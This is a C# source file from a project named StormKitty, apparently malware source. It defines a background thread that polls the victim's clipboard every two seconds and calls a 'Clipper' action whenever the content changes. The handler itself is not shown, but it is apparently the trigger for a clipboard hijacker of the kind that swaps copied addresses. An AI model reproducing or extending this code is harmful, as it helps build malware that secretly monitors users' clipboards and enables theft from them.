/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System.Threading;

namespace StormKitty
{
    internal sealed class ClipboardManager
    {
        // Current clipboard content
        public static string PrevClipboard = "";
        public static string ClipboardText;
        public static Thread MainThread = new Thread(Run);

        // Run clipboard checker
        private static void Run()
        {
            while (true)
            {
                Thread.Sleep(2000);
                ClipboardText = Clipper.Clipboard.GetText();
                if (ClipboardText != PrevClipboard)
                {
                    PrevClipboard = ClipboardText;
                    Clipper.EventManager.Action();
                }
            }
        }

    }
}
